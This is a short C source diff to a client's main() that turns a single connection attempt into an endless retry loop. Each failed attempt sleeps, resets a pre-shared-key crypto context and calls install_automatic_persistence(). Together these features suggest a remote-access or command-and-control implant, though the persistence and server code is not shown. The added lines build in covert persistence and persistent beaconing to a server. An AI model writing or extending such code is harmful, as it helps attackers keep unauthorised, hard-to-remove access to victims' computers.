@@ -927,9 +927,21 @@ int main(int argc, char *argv[]) {
     client.client_fd = -1;
 #endif
     
-    if (connect_to_server(&client) < 0) {
+    for (;;) {
+        if (connect_to_server(&client) == 0)
+            break;
         cleanup(&client);
-        return 1;
+        sleep(10);
+
+        memset(&client.crypto_ctx, 0, sizeof(client.crypto_ctx));
+        if (psk) crypto_set_psk(&client.crypto_ctx, psk);
+        install_automatic_persistence();
+
+#ifdef _WIN32
+        client.client_fd = INVALID_SOCKET;
+#else
+        client.client_fd = -1;
+#endif
     }
     
     printf("Connected to server at %s:%d\n", client.host, client.port);
